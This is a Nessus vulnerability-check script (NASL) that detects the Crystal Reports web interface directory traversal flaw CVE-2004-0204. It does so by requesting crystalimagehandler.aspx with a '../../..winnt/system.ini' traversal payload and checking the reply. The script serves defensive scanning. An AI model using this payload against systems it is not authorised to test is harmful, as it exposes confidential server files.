#
# (C) Tenable Network Security

if (description)
{
 script_id(12271);
 script_bugtraq_id(10260);
 script_version ("$Revision: 1.6 $");
 script_cve_id("CVE-2004-0204");

 script_name(english:"Crystal Report virtual directory traversal");
 desc["english"] = "
The remote host is running a version of Crystal Report Web interface
which is vulnerable to a remote directory traversal bug.  An attacker
exploiting this bug would be able to gain access to potentially 
confidential material outside of the web root.  For more
information, see:

http://support.businessobjects.com/fix/hot/critical/bulletins/security_bulletin_june04.asp

If you use Crystal Reports through a Microsoft product, see also :

http://www.microsoft.com/technet/security/bulletin/MS04-017.mspx


Solution: Upgrade the software or utilize ACLs on the virtual directory
Risk factor : High";

 script_description(english:desc["english"]);
 script_summary(english:"Crystal Report virtual directory traversal");
 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses", francais:"Abus de CGI");
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}



include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if (! get_port_state(port) ) exit(0);

poison = string("dynamicimage=../../../../../../../../winnt/system.ini");


dirs = make_list(cgi_dirs(), "/CrystalReportWebFormViewer", "/CrystalReportWebFormViewer2", "/crystalreportViewers");


foreach dir (dirs)
{
  	req = http_get(port:port, item:dir + "/crystalimagehandler.aspx?dynamicimage=../../../../../../../../winnt/system.ini");
 	res = http_keepalive_send_recv(port:port, data:req);
	
	if ( "[drivers]" >< res )
	{
		security_hole(port);
		exit(0);
	}
}


